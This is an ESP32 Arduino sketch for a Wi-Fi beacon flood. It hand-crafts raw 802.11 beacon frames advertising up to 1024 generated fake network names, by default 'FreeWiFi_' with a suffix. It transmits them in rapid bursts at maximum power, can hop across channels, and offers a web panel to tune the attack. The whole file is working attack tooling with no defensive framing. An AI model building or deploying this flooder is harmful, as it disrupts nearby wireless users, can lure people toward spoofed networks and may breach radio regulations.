// ============================================================================
// ESP32 Beacon SSID Flood - 1000+ SSIDs
// ============================================================================
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_mac.h>

#define MAX_SSIDS            1024
#define SSID_MAX_LEN         32
#define BEACON_BURST_DEFAULT 16
#define BEACON_INTERVAL_MS   100
#define CHANNEL_DWELL_MS     500
#define NVS_DEBOUNCE_MS      750
#define BOOT_HOLD_MS         5000
#define BOOT_BTN_PIN         0
#define WEB_PORT             80

#define CFG_MAGIC   0xBEA5F100
#define CFG_VERSION 2

struct __attribute__((packed)) BeaconCfg {
  uint32_t magic;
  uint16_t version;
  uint16_t crc;

  uint8_t  apChannel;
  int8_t   apTxPower;
  uint8_t  apHidden;
  uint8_t  apMaxConn;
  char     apSsid[33];
  char     apPass[65];

  uint8_t  enabled;
  uint8_t  burst;
  uint8_t  hopChannels;
  uint8_t  channelDwell;

  uint16_t ssidCount;
  uint8_t  genPrefix[24];
  uint8_t  genStartBase;
  uint16_t genCount;
  uint8_t  genPad;

  char     ssidList[MAX_SSIDS][SSID_MAX_LEN + 1];
};

static BeaconCfg gCfg;
static volatile bool gCfgDirty = false;
static uint32_t gLastCfgChange = 0;
static uint8_t  gCfgSaveFails = 0;

static WebServer   gWeb(WEB_PORT);
static Preferences gPrefs;

static uint32_t gLastBurstMs   = 0;
static uint16_t gSsidCursor    = 0;
static uint8_t  gCurrentChannel = 6;
static uint32_t gLastHopMs     = 0;

static uint32_t gTxOk          = 0;
static uint32_t gTxErr         = 0;
static uint32_t gTxSkipped     = 0;
static uint32_t gBootHoldStart = 0;
static bool     gBootHeld      = false;
static uint32_t gRebootAtMs    = 0;
static bool     gWipeOnReboot  = false;
static uint32_t gBootCount     = 0;
static uint32_t gBootStableMs  = 0;

static void   cfgDefaults(BeaconCfg& c);
static uint16_t cfgCrc(const BeaconCfg& c);
static bool   cfgValidate(BeaconCfg& c);
static bool   cfgLoad();
static void   cfgMarkDirty();
static void   cfgSaveIfDirty(uint32_t now);
static void   applyAP();
static void   regenerateSsids();
static void   pollBeacon(uint32_t now);
static void   broadcastOne(const char* ssid, uint8_t chan);
static void   setupWeb();
static void   setupFactoryButton();
static void   pollFactoryButton(uint32_t now);
static void   requestReboot(uint32_t delayMs, bool wipe);
static void   pollReboot(uint32_t now);
static void   sendProgmem(WebServer& s, const char* p);
static void   safeStrLocal(char* dst, size_t cap, const String& s);
static void   jsonEscapeLocal(char* dst, size_t dstSz, const char* src);
static bool   parseIP(const String& s, uint8_t out[4]);

static void cfgDefaults(BeaconCfg& c) {
  memset(&c, 0, sizeof(c));
  c.magic   = CFG_MAGIC;
  c.version = CFG_VERSION;

  uint8_t mac[6];
  esp_read_mac(mac, ESP_MAC_WIFI_SOFTAP);
  strncpy(c.apSsid, "ESP32-Flood", sizeof(c.apSsid) - 1);
  snprintf(c.apPass, sizeof(c.apPass), "flood-%02x%02x%02x", mac[3], mac[4], mac[5]);
  c.apChannel = 6;
  c.apTxPower = -1;
  c.apHidden  = 0;
  c.apMaxConn = 4;

  c.enabled      = 1;
  c.burst        = BEACON_BURST_DEFAULT;
  c.hopChannels  = 0;
  c.channelDwell = 5;

  c.ssidCount = 0;
  strncpy((char*)c.genPrefix, "FreeWiFi_", sizeof(c.genPrefix) - 1);
  c.genStartBase = 36;
  c.genCount     = 512;
  c.genPad       = 0;

  regenerateSsids();
}

static uint16_t cfgCrc(const BeaconCfg& c) {
  const uint8_t* p = (const uint8_t*)&c;
  size_t len = sizeof(BeaconCfg);
  size_t skipOff = offsetof(BeaconCfg, crc);
  uint16_t crc = 0xFFFF;
  for (size_t i = 0; i < len; i++) {
    if (i >= skipOff && i < skipOff + sizeof(c.crc)) continue;
    crc ^= (uint16_t)p[i] << 8;
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : (crc << 1);
  }
  return crc;
}

static bool cfgValidate(BeaconCfg& c) {
  bool fixed = false;
  if (c.apChannel < 1 || c.apChannel > 13) { c.apChannel = 6; fixed = true; }
  if (c.apMaxConn < 1 || c.apMaxConn > 10) { c.apMaxConn = 4; fixed = true; }
  if (c.apTxPower < -1 || c.apTxPower > 84) { c.apTxPower = -1; fixed = true; }
  if (c.apHidden > 1) { c.apHidden = 0; fixed = true; }
  if (c.enabled > 1)  { c.enabled = 1; fixed = true; }
  if (c.burst < 1 || c.burst > 64) { c.burst = BEACON_BURST_DEFAULT; fixed = true; }
  if (c.hopChannels > 1) { c.hopChannels = 0; fixed = true; }
  if (c.channelDwell < 5 || c.channelDwell > 50) { c.channelDwell = 5; fixed = true; }
  if (c.genStartBase != 10 && c.genStartBase != 36) { c.genStartBase = 36; fixed = true; }
  if (c.genPad > 6) { c.genPad = 0; fixed = true; }
  if (c.genCount > MAX_SSIDS) { c.genCount = MAX_SSIDS; fixed = true; }
  if (c.ssidCount > MAX_SSIDS) { c.ssidCount = MAX_SSIDS; fixed = true; }

  c.apSsid[32] = 0;
  c.apPass[64] = 0;
  for (int i = 0; i < MAX_SSIDS; i++) c.ssidList[i][SSID_MAX_LEN] = 0;
  return fixed;
}

static bool cfgLoad() {
  gPrefs.begin("beacon", true);
  size_t got = gPrefs.getBytesLength("cfg");
  bool ok = false;
  if (got == sizeof(BeaconCfg)) {
    BeaconCfg tmp;
    gPrefs.getBytes("cfg", &tmp, sizeof(tmp));
    if (tmp.magic == CFG_MAGIC && tmp.version == CFG_VERSION) {
      if (cfgCrc(tmp) == tmp.crc) {
        cfgValidate(tmp);
        memcpy(&gCfg, &tmp, sizeof(gCfg));
        ok = true;
      }
    }
  }
  gPrefs.end();
  if (!ok) {
    cfgDefaults(gCfg);
    gCfg.crc = cfgCrc(gCfg);
  }
  return ok;
}

static void cfgMarkDirty() {
  gCfgDirty = true;
  gLastCfgChange = millis();
  gCfgSaveFails = 0;
}

static void cfgSaveIfDirty(uint32_t now) {
  if (!gCfgDirty || gCfgSaveFails >= 5) return;
  if ((uint32_t)(now - gLastCfgChange) < NVS_DEBOUNCE_MS) return;

  gCfg.crc = cfgCrc(gCfg);
  if (!gPrefs.begin("beacon", false)) {
    gCfgSaveFails++;
    gLastCfgChange = now;
    Serial.printf("[cfg] open fail (%u/5)\n", gCfgSaveFails);
    return;
  }
  size_t w = gPrefs.putBytes("cfg", &gCfg, sizeof(gCfg));
  gPrefs.end();
  if (w == sizeof(gCfg)) {
    gCfgDirty = false;
    gCfgSaveFails = 0;
  } else {
    gCfgSaveFails++;
    gLastCfgChange = now;
    Serial.printf("[cfg] write short (%u/5)\n", gCfgSaveFails);
  }
}

static void generateSsid(uint16_t idx, char out[SSID_MAX_LEN + 1]) {
  const char* prefix = (const char*)gCfg.genPrefix;
  uint8_t pad = gCfg.genPad;
  uint8_t base = gCfg.genStartBase;

  char suffix[8];
  int sp = 0;
  if (base == 10) {
    snprintf(suffix, sizeof(suffix), "%0*u", pad ? pad : 1, (unsigned)idx);
    sp = strlen(suffix);
  } else {
    static const char* B36 = "0123456789abcdefghijklmnopqrstuvwxyz";
    char tmp[8];
    int tp = 0;
    unsigned v = idx;
    do {
      tmp[tp++] = B36[v % 36];
      v /= 36;
    } while (v);
    while (tp < pad && tp < 7) tmp[tp++] = '0';
    while (tp > 0) suffix[sp++] = tmp[--tp];
    suffix[sp] = 0;
  }

  int plen = (int)strlen(prefix);
  int maxSuffix = SSID_MAX_LEN - plen;
  if (maxSuffix < 1) maxSuffix = 1;
  if (sp > maxSuffix) sp = maxSuffix;

  int pos = 0;
  for (int i = 0; i < plen && pos < SSID_MAX_LEN; i++) out[pos++] = prefix[i];
  for (int i = 0; i < sp   && pos < SSID_MAX_LEN; i++) out[pos++] = suffix[i];
  out[pos] = 0;
}

static void regenerateSsids() {
  uint16_t n = gCfg.genCount;
  if (n > MAX_SSIDS) n = MAX_SSIDS;
  for (uint16_t i = 0; i < n; i++) {
    generateSsid(i, gCfg.ssidList[i]);
  }
  gCfg.ssidCount = n;
}

static void applyAP() {
  const char* pass = (strlen(gCfg.apPass) >= 8) ? gCfg.apPass : nullptr;
  WiFi.softAP(gCfg.apSsid, pass, gCfg.apChannel, gCfg.apHidden != 0, gCfg.apMaxConn);
  int8_t tx = (gCfg.apTxPower < 0) ? 84 : gCfg.apTxPower;
  if (tx < 8) tx = 8;
  if (tx > 84) tx = 84;
  esp_wifi_set_max_tx_power(tx);
  esp_wifi_set_ps(WIFI_PS_NONE);
  gCurrentChannel = gCfg.apChannel;
}

static void broadcastOne(const char* ssid, uint8_t chan) {
  if (!ssid || !ssid[0]) { gTxSkipped++; return; }

  uint8_t frame[160];
  size_t off = 0;
  static uint16_t seq = 0;

  frame[off++] = 0x80; frame[off++] = 0x00;
  frame[off++] = 0x00; frame[off++] = 0x00;

  for (int i = 0; i < 6; i++) frame[off++] = 0xFF;

  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  for (int i = 0; i < 6; i++) frame[off++] = mac[i];
  for (int i = 0; i < 6; i++) frame[off++] = mac[i];

  frame[off++] = (uint8_t)((seq & 0x0F) << 4);
  frame[off++] = 0x00;
  seq = (seq + 1) & 0x0FFF;

  for (int i = 0; i < 8; i++) frame[off++] = 0x00;

  frame[off++] = 0x64; frame[off++] = 0x00;
  frame[off++] = 0x01; frame[off++] = 0x00;

  size_t slen = strnlen(ssid, SSID_MAX_LEN);
  if (off + 2 + slen > sizeof(frame)) { gTxSkipped++; return; }
  frame[off++] = 0x00;
  frame[off++] = (uint8_t)slen;
  memcpy(&frame[off], ssid, slen);
  off += slen;

  const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  frame[off++] = 0x01; frame[off++] = sizeof(rates);
  memcpy(&frame[off], rates, sizeof(rates)); off += sizeof(rates);

  frame[off++] = 0x03; frame[off++] = 1; frame[off++] = chan;

  if (off > sizeof(frame)) { gTxSkipped++; return; }

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
  if (err == ESP_OK) gTxOk++;
  else               gTxErr++;
}

static void pollBeacon(uint32_t now) {
  if (!gCfg.enabled || gCfg.ssidCount == 0) return;
  if ((uint32_t)(now - gLastBurstMs) < BEACON_INTERVAL_MS) return;
  gLastBurstMs = now;

  if (gCfg.hopChannels) {
    uint32_t dwell = (uint32_t)gCfg.channelDwell * 100UL;
    if ((uint32_t)(now - gLastHopMs) >= dwell) {
      gLastHopMs = now;
      gCurrentChannel = (gCurrentChannel >= 13) ? 1 : (gCurrentChannel + 1);
      esp_wifi_set_channel(gCurrentChannel, WIFI_SECOND_CHAN_NONE);
    }
  } else {
    gCurrentChannel = gCfg.apChannel;
  }

  uint8_t burst = gCfg.burst;
  if (burst > 64) burst = 64;

  for (uint8_t i = 0; i < burst; i++) {
    if (gSsidCursor >= gCfg.ssidCount) gSsidCursor = 0;
    broadcastOne(gCfg.ssidList[gSsidCursor], gCurrentChannel);
    gSsidCursor++;
    if ((i & 0x07) == 0x07) delay(1);
  }
}

static const char PAGE_INDEX[] PROGMEM = R"HTML(
<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>ESP32 Beacon Flood</title>
<style>body{font-family:sans-serif;max-width:640px;margin:2em auto;padding:0 1em}
label{display:block;margin:.5em 0}input{width:100%;padding:.4em;box-sizing:border-box}
button{margin-top:1em;padding:.6em 1.2em}.row{display:flex;gap:1em}
.stat{font-family:monospace;background:#f4f4f4;padding:.6em;border-radius:4px}</style>
<h1>ESP32 Beacon Flood</h1>
<form method=post action="/save">
<label>AP SSID <input name=apssid maxlength=32></label>
<label>AP Password (blank=open, or >=8) <input name=appass type=password maxlength=64></label>
<label>AP Channel <input name=apchan type=number min=1 max=13></label>
<label>SSID Prefix <input name=prefix maxlength=23></label>
<label>Generator count (1..1024) <input name=count type=number min=1 max=1024></label>
<label>Base (10 or 36) <input name=base type=number min=10 max=36 step=26></label>
<label>Zero-pad width (0..6) <input name=pad type=number min=0 max=6></label>
<div class=row>
<label><input type=checkbox name=en value=1> Enabled</label>
<label><input type=checkbox name=hop value=1> Channel hop</label>
</div>
<label>Burst per tick (1..64) <input name=burst type=number min=1 max=64></label>
<button>Save &amp; Regenerate</button>
</form>
<form method=post action="/factory" onsubmit="return confirm('Factory reset?')">
<button>Factory Reset</button></form>
<p class=stat id=st>loading…</p>
<script>
async function tick(){
  const r=await fetch('/api/status');const j=await r.json();
  document.getElementById('st').textContent =
    'SSIDs='+j.ssids+' | cursor='+j.cursor+' | chan='+j.chan+
    ' | ok='+j.ok+' err='+j.err+' skip='+j.skip+
    ' | burst='+j.burst+' | heap='+j.heap;
}
setInterval(tick,1000);tick();
fetch('/api/cfg').then(r=>r.json()).then(j=>{
  const f=document.forms[0];
  f.apssid.value=j.apssid; f.apchan.value=j.apchan;
  f.prefix.value=j.prefix; f.count.value=j.count;
  f.base.value=j.base; f.pad.value=j.pad;
  f.en.checked=j.en; f.hop.checked=j.hop; f.burst.value=j.burst;
});
</script>
)HTML";

static void sendProgmem(WebServer& s, const char* p) { s.send_P(200, "text/html", p); }

static void handleRoot() { sendProgmem(gWeb, PAGE_INDEX); }

static void handleSave() {
  if (gWeb.hasArg("apssid") && gWeb.arg("apssid").length() > 0)
    safeStrLocal(gCfg.apSsid, sizeof(gCfg.apSsid), gWeb.arg("apssid"));
  if (gWeb.hasArg("appass")) {
    String p = gWeb.arg("appass");
    if (p.length() > 0 && p.length() < 8) {
      gWeb.send(400, "text/plain", "AP password must be >=8 or blank");
      return;
    }
    if (p.length() >= 8) safeStrLocal(gCfg.apPass, sizeof(gCfg.apPass), p);
  }
  if (gWeb.hasArg("apchan")) {
    long v = gWeb.arg("apchan").toInt();
    if (v >= 1 && v <= 13) gCfg.apChannel = (uint8_t)v;
  }
  if (gWeb.hasArg("prefix"))
    safeStrLocal((char*)gCfg.genPrefix, sizeof(gCfg.genPrefix), gWeb.arg("prefix"));
  if (gWeb.hasArg("count")) {
    long v = gWeb.arg("count").toInt();
    if (v >= 1 && v <= MAX_SSIDS) gCfg.genCount = (uint16_t)v;
  }
  if (gWeb.hasArg("base")) {
    long v = gWeb.arg("base").toInt();
    if (v == 10 || v == 36) gCfg.genStartBase = (uint8_t)v;
  }
  if (gWeb.hasArg("pad")) {
    long v = gWeb.arg("pad").toInt();
    if (v >= 0 && v <= 6) gCfg.genPad = (uint8_t)v;
  }
  gCfg.enabled     = gWeb.hasArg("en")  ? 1 : 0;
  gCfg.hopChannels = gWeb.hasArg("hop") ? 1 : 0;
  if (gWeb.hasArg("burst")) {
    long v = gWeb.arg("burst").toInt();
    if (v >= 1 && v <= 64) gCfg.burst = (uint8_t)v;
  }

  cfgValidate(gCfg);
  regenerateSsids();
  gSsidCursor = 0;
  cfgMarkDirty();
  applyAP();
  gWeb.sendHeader("Location", "/"); gWeb.send(302, "text/plain", "");
}

static void handleStatusApi() {
  char buf[256];
  snprintf(buf, sizeof(buf),
    "{\"ssids\":%u,\"cursor\":%u,\"chan\":%u,\"ok\":%lu,\"err\":%lu,\"skip\":%lu,"
    "\"burst\":%u,\"heap\":%lu}",
    (unsigned)gCfg.ssidCount, (unsigned)gSsidCursor,
    (unsigned)gCurrentChannel,
    (unsigned long)gTxOk, (unsigned long)gTxErr, (unsigned long)gTxSkipped,
    (unsigned)gCfg.burst, (unsigned long)ESP.getFreeHeap());
  gWeb.send(200, "application/json", buf);
}

static void handleCfgApi() {
  char prefix[64];
  jsonEscapeLocal(prefix, sizeof(prefix), (const char*)gCfg.genPrefix);
  char buf[320];
  snprintf(buf, sizeof(buf),
    "{\"apssid\":\"%s\",\"apchan\":%u,\"prefix\":\"%s\",\"count\":%u,"
    "\"base\":%u,\"pad\":%u,\"en\":%u,\"hop\":%u,\"burst\":%u}",
    gCfg.apSsid, (unsigned)gCfg.apChannel, prefix,
    (unsigned)gCfg.genCount, (unsigned)gCfg.genStartBase,
    (unsigned)gCfg.genPad, (unsigned)gCfg.enabled,
    (unsigned)gCfg.hopChannels, (unsigned)gCfg.burst);
  gWeb.send(200, "application/json", buf);
}

static void handleFactory() {
  gWeb.send(200, "text/plain", "rebooting");
  requestReboot(800, true);
}

static void handleNotFound() {
  gWeb.send(404, "text/plain", "Not found");
}

static void safeStrLocal(char* dst, size_t cap, const String& s) {
  size_t n = s.length();
  if (n >= cap) n = cap - 1;
  memcpy(dst, s.c_str(), n);
  dst[n] = 0;
}

static void jsonEscapeLocal(char* dst, size_t dstSz, const char* src) {
  size_t j = 0;
  for (size_t i = 0; src[i] && j + 6 < dstSz; i++) {
    unsigned char c = (unsigned char)src[i];
    if (c == '"' || c == '\\') { dst[j++] = '\\'; dst[j++] = (char)c; }
    else if (c < 0x20)         { dst[j++] = '?'; }
    else                       { dst[j++] = (char)c; }
  }
  dst[j] = 0;
}

static bool parseIP(const String& s, uint8_t out[4]) {
  int a,b,c,d; char e=0;
  if (sscanf(s.c_str(), "%d.%d.%d.%d%c", &a,&b,&c,&d,&e) != 4) return false;
  if ((a|b|c|d) & ~0xFF) return false;
  out[0]=a; out[1]=b; out[2]=c; out[3]=d;
  return true;
}

static void setupWeb() {
  gWeb.on("/", HTTP_GET, handleRoot);
  gWeb.on("/save", HTTP_POST, handleSave);
  gWeb.on("/factory", HTTP_POST, handleFactory);
  gWeb.on("/api/status", HTTP_GET, handleStatusApi);
  gWeb.on("/api/cfg", HTTP_GET, handleCfgApi);
  gWeb.onNotFound(handleNotFound);
  gWeb.begin();
}

static void setupFactoryButton() { pinMode(BOOT_BTN_PIN, INPUT_PULLUP); }

static void pollFactoryButton(uint32_t now) {
  bool pressed = (digitalRead(BOOT_BTN_PIN) == LOW);
  if (pressed && !gBootHeld) {
    gBootHeld = true; gBootHoldStart = now;
  } else if (!pressed && gBootHeld) {
    gBootHeld = false;
  } else if (pressed && gBootHeld) {
    if ((uint32_t)(now - gBootHoldStart) >= BOOT_HOLD_MS) {
      gBootHeld = false;
      requestReboot(500, false);
      gBootHoldStart = now + BOOT_HOLD_MS + 1000;
    }
  }
}

static void requestReboot(uint32_t delayMs, bool wipe) {
  if (gRebootAtMs != 0) {
    if (wipe && !gWipeOnReboot) {
      gWipeOnReboot = true;
      uint32_t newAt = millis() + delayMs;
      if ((int32_t)(newAt - gRebootAtMs) < 0) gRebootAtMs = newAt;
    }
    return;
  }
  gRebootAtMs = millis() + delayMs;
  gWipeOnReboot = wipe;
}

static void pollReboot(uint32_t now) {
  if (!gRebootAtMs) return;
  if ((int32_t)(now - gRebootAtMs) < 0) return;
  gWeb.stop();
  if (gWipeOnReboot) {
    gPrefs.begin("beacon", false); gPrefs.clear(); gPrefs.end();
  } else if (gCfgDirty) {
    gCfg.crc = cfgCrc(gCfg);
    if (gPrefs.begin("beacon", false)) {
      gPrefs.putBytes("cfg", &gCfg, sizeof(gCfg));
      gPrefs.end();
      gCfgDirty = false;
    }
  }
  delay(200);
  ESP.restart();
}

void setup() {
  Serial.begin(115200);

  gPrefs.begin("sys", true);
  gBootCount = gPrefs.getUInt("boots", 0) + 1;
  gPrefs.end();
  gPrefs.begin("sys", false);
  gPrefs.putUInt("boots", gBootCount);
  gPrefs.end();
  Serial.printf("Boot #%lu\n", (unsigned long)gBootCount);

  cfgLoad();
  cfgValidate(gCfg);
  regenerateSsids();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP);
  WiFi.setSleep(false);
  WiFi.setAutoReconnect(false);

  applyAP();
  Serial.printf("AP SSID: %s\nAP PASS: %s\n", gCfg.apSsid, gCfg.apPass);
  Serial.printf("Beacon flood: %u SSIDs, burst=%u, hop=%u\n",
                (unsigned)gCfg.ssidCount, (unsigned)gCfg.burst,
                (unsigned)gCfg.hopChannels);

  setupWeb();
  setupFactoryButton();

  gLastBurstMs = millis();
  gLastHopMs   = millis();
  gBootStableMs = millis();
}

void loop() {
  uint32_t now = millis();
  if (gBootStableMs && (uint32_t)(now - gBootStableMs) > 30000UL) {
    gPrefs.begin("sys", false); gPrefs.putUInt("boots", 0); gPrefs.end();
    gBootStableMs = 0;
  }
  pollBeacon(now);
  gWeb.handleClient();
  pollFactoryButton(now);
  cfgSaveIfDirty(now);
  pollReboot(now);
}
